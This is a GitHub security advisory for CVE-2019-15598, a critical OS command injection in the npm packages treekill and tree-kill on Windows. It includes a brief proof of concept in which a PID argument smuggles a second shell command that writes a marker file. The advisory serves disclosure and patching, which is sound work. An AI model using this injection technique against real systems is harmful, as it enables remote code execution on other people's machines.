# [C] Treekill Enables OS Command Injection

## Summary
Severity: Critical
Advisory: GHSA-j7fq-p9q7-5wfv
CVE: CVE-2019-15598
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2022-05-24
Source: https://github.com/advisories/GHSA-j7fq-p9q7-5wfv
Type: github-advisory

## Affected
- npm: `tree-kill` — affected >=0 <1.2.2

## Details
A Code Injection exists in treekill and tree-kill on Windows which allows a remote code execution when an attacker is able to control the input into the command.

### Steps To Reproduce:
Create the following PoC file:

```js
var kill = require('treekill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
```

Execute the following commands in terminal:

```shell
npm i treekill # Install affected module
dir # Check *HACKED.txt* doesn't exist
node poc.js #  Run the PoC
dir # Now *HACKED.txt* exists :)
```

The HACKED.txt has been created

## References
- https://nvd.nist.gov/vuln/detail/CVE-2019-15598
- https://github.com/pkrumins/node-tree-kill/issues/30
- https://github.com/pkrumins/node-tree-kill/pull/31
- https://github.com/pkrumins/node-tree-kill/commit/ff73dbf144c4c2daa67799a50dfff59cd455c63c
- https://hackerone.com/reports/701183
- https://hackerone.com/reports/703415
- https://github.com/node-modules/treekill/blob/master/index.js#L32
- https://github.com/pkrumins/node-tree-kill
- https://security.snyk.io/vuln/SNYK-JS-TREEKILL-536781
